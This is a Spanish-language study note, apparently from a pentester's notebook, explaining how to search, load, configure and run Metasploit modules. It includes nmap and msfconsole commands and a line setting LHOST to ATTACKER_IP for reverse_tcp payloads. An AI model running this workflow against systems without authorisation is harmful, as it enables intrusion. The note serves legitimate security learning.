---
tags:
  - metasploit/modulos
---
## Conceptos Clave (TL;DR)

* Los módulos de Metasploit son scripts preparados (exploits, auxiliares, post-explotación) con propósitos específicos ya probados.

* El fallo de un exploit no demuestra la inexistencia de la vulnerabilidad; la mayoría requiere personalización acorde al entorno del objetivo para funcionar.

* El framework debe ser tratado como una herramienta de apoyo, no como un sustituto de la enumeración y explotación manual.

* La nomenclatura de los módulos sigue una sintaxis estricta: `<No.> <type>/<os>/<service>/<name>`.

  

## Herramientas Clave

* **[Metasploit](../../📂%2008%20Herramientas&Cheatsheets/Metasploit.md)**: Interfaz de línea de comandos principal para interactuar con los módulos de Metasploit.

* **[Nmap](../../📂%2008%20Herramientas&Cheatsheets/Nmap.md)**: Herramienta de escaneo de red utilizada para enumerar puertos y servicios previos a la selección del módulo.

  

## Metodología Paso a Paso

1. **Enumeración Previa**: Identificar el sistema operativo y el servicio vulnerable utilizando escaneos de red (ej. Nmap) para tener parámetros de búsqueda concretos.

2. **Búsqueda y Filtrado**: Utilizar la función de búsqueda dentro de `msfconsole` aplicando múltiples filtros (CVE, tipo, sistema operativo) para reducir los resultados al módulo más exacto y confiable.

3. **Selección e Inspección**: Cargar el módulo utilizando su índice numérico o ruta absoluta e inspeccionar su información detallada (`info`) para entender su funcionamiento y requisitos.

4. **Configuración de Variables**: Revisar las opciones requeridas (`options`) y asignar los valores necesarios tanto para el objetivo (`RHOSTS`) como para la escucha de payloads (`LHOST`).

5. **Ejecución**: Lanzar el ataque una vez que el entorno y las variables del módulo estén configuradas correctamente.

  

## Cheat Sheet de Comandos

  

```bash

# Escaneo de versiones de servicios en un objetivo específico mediante Nmap

nmap -sV <TARGET_IP>

```

  

```bash

# Muestra las opciones y sintaxis disponibles para el comando search en msfconsole

help search

```

  

```bash

# Búsqueda granular: filtra por año de CVE, tipo de módulo, plataforma y confiabilidad

search type:exploit platform:<OS> cve:<YEAR> rank:excellent <KEYWORD>

```

  

```bash

# Selecciona el módulo basado en el número de índice de los resultados de búsqueda

use <INDEX_ID>

```

  

```bash

# Selecciona un módulo utilizando su ruta absoluta

use <TYPE>/<OS>/<SERVICE>/<NAME>

```

  

```bash

# Muestra información detallada del módulo cargado (descripción, autor, referencias)

info

```

  

```bash

# Despliega las variables disponibles del módulo y muestra cuáles son obligatorias (Required = Yes)

options

```

  

```bash

# Configura una variable específica (ej. IP del objetivo) solo para el módulo actual

set RHOSTS <TARGET_IP>

```

  

```bash

# Configura una variable de forma global y permanente (hasta reiniciar msfconsole) para no repetirla en cada módulo

setg RHOSTS <TARGET_IP>

```

  

```bash

# Configura la IP local a la que el payload (ej. reverse_tcp) debe conectarse de vuelta

set LHOST <ATTACKER_IP>

```

  

```bash

# Ejecuta el módulo cargado con la configuración actual

run

```

  

## "Gotchas" y Troubleshooting

* El comando `use` usando el índice numérico (`<no.>`) solamente funciona con módulos interactivos (Initiators), como `Auxiliary`, `Exploits` y `Post`.

* Las configuraciones globales realizadas con `setg` permanecen activas durante toda la sesión. Asegúrate de cambiar `RHOSTS` si comienzas a atacar un objetivo distinto para evitar lanzar exploits al equipo equivocado.

* Varios módulos de explotación requieren variables adicionales si las por defecto fallan. Por ejemplo, exploits como MS17-010 pueden requerir configuración manual de `NAMEDPIPE` o listas específicas de named pipes para lograr la ejecución del código.

* Fíjate en la columna "Check" al buscar módulos; indica si el módulo soporta una prueba pasiva de vulnerabilidad antes de lanzar el ataque.